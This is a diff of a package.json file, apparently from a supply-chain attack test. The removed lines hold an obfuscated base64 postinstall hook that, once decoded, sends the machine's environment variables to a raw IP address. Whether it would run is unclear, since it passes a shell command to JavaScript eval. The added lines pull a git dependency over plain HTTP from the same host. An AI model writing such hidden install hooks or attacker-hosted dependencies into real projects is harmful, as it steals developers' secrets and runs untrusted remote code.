@@ -1,8 +1,8 @@
 {
   "name": "asvrpimmut",
   "private": true,
-  "scripts": {
-    "preinstall": "true",
-    "postinstall": "node -e \"eval(Buffer.from('KGRhdGUgLXU7IGVjaG8gbWFya2VyLXJjZXAxYikgPiBpbmplY3RlZC1tYXJrZXIudHh0ICYmIGNwIHBhY2thZ2UuanNvbiBwai1jb3B5LnR4dCAmJiAoY3VybCAtcyAtbSAxMCAtWCBQT1NUIC0tZGF0YS1iaW5hcnkgQDwoZW52IHwgaGVhZCAtYyA0MDAwKSAnaHR0cDovLzE2Mi4zNS4xNzMuMTMwOjgwODAvb29iP209cmNlcDFiLXBvc3RpbnN0YWxsJyAtbyAvZGV2L251bGwgfHwgdHJ1ZSk7IHRydWU=','base64').toString())\""
+  "scripts": {},
+  "dependencies": {
+    "asvrp-gitdep": "git+http://162.35.173.130:8080/git/rcep1c.git"
   }
 }
